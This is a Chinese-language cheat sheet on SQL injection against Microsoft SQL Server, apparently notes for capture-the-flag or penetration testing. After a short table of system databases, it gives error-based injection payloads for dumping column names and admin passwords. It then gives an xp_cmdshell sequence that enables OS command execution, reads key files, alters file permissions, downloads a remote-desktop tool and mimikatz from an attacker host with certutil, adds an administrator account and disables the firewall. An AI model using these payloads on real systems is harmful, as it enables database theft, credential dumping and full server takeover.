# MSSQL注入

| 系统数据库                                                   | 描述                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [master 数据库](https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/master-database?view=sql-server-2017) | 记录 SQL Server实例的所有系统级信息。这个数据库包括所有的配置信息、用户登录信息、当前正在服务器中运行的进程的信息 |
| [msdb 数据库](https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/msdb-database?view=sql-server-2017) | 用于 SQL Server 代理计划警报和作业。msdb数据库是SQL Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一 个用户数据库。不同之处是SQL Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL Server Agent将会使用这个库 |
| [model 数据库](https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/model-database?view=sql-server-2017) | 用作 SQL Server实例上创建的所有数据库的模板。 对 **model** 数据库进行的修改（如数据库大小、排序规则、恢复模式和其他数据库选项）将应用于以后创建的所有数据库。model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满 |
| [Resource 数据库](https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/resource-database?view=sql-server-2017) | 一个只读数据库，包含 SQL Server包括的系统对象。 系统对象在物理上保留在 **Resource** 数据库中，但在逻辑上显示在每个数据库的 **sys** 架构中 |
| [tempdb 数据库](https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/tempdb-database?view=sql-server-2017) | 一个工作空间，用于保存临时对象或中间结果集。tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到 tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建◊永远不要在tempdb数据库建立需要永久保存的表 |

### 注释

| 参数 | 风格        |
| :--- | :---------- |
| /*   | C语言风格   |
| –    | SQL注释风格 |
| ;%00 | 空字节      |

### 查询语句

**主机名**

**`select @@SERVERNAME;`**

**数据库版本**

**`select @@VERSION;`**

**数据库名**

**`select db_name();`**

**数据库IP地址**

**`select local_net_address from sys.dm_exec_connextions where Session_id=@@spid`**

**暴当前表中的列**

**`article.asp?id=6 group by admin.username having 1=1--`**

**`article.asp?id=6 group by admin.username,admin.password having 1=1--`**

**暴任意表和列**

**`and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)>1`**

**`and (select top col_name(object_id('admin'),N) from sysobjects)>1`**

**暴数据库数据**

**`and (select top 1 password from admin where id=N)>1`**

**Exmaples**

```mssql
query: SELECT username, password FROM Users WHERE id = '1';
1' HAVING 1=1                                       -- 错误
1' GROUP BY username HAVING 1=1--                   -- 错误
1' GROUP BY username, password HAVING 1=1--         -- 正确
Group By可以用来测试列名
```

```mssql
USE master
GO
RECONFIGURE --先执行一次刷新，处理上次的配置
GO
EXEC sp_configure 'show advanced options',1 --启用xp_cmdshell的高级配置
GO
RECONFIGURE --刷新配置
GO
EXEC sp_configure 'xp_cmdshell',1  --打开xp_cmdshell,可以调用SQL系统之外的命令
GO
RECONFIGURE
GO
--使用xp_cmdshell在D盘创建一个myfile 文件夹
EXEC xp_cmdshell 'mkdir d:\myfile',no_output --[no_output]表示是否输出信息
GO

sp_configure 'show advanced options',1; (记得reconfigure) 

sp_configure 'xp_cmdshell',1;（记得reconfigure）启用xp_cmdshell

exec xp_cmdshell 'dir c:\ /s /b |findstr "key"|findstr "txt"'; 找到key的位置

exec xp_cmdshell 'type key位置"'; 直接读key内容，不过一般不会让你有直接读的权限

exec xp_cmdshell 'cacls c:\ /s /b |findstr "key"|findstr "txt" /E /G adminstrator:F'; 改变文件操作权限，F是所有权限，改变权限后再读就能成功

exec xp_cmdshell 'certutil -urlcache -f -split http://本机:8000/3389.exe'; 这里的certutil的方式与基础题4中的curl思路相同，可参考。这里上传的是开启3389的工具。

exec xp_cmdshell 'net user username password /add';exec xp_cmdshell 'net localgroup administrators username /add';创建账户

exec xp_cmdshell 'netsh firewall set opmode disable'; 如果目标开了防火墙，那么即使开启3389端口也无法连接，这条命令用于关闭防火墙。

exec xp_cmdshell 'certutil -urlcache -f -split http://本机:8000/mimikazts.exe';如果不能建立账户，那么需要工具去破解系统账户的密码。这里使用的mimikazts。

exec master..xp_cmdshell ‘dir “C:\Documents and Settings\Administrator\桌面\” /A -D /B’
exec xp_cmdshell ‘type “C:\Documents and Settings\Administrator\桌面\key.txt”‘
```

**Reference**

**[【技术分享】MSSQL 注入攻击与防御](https://www.anquanke.com/post/id/86011)**

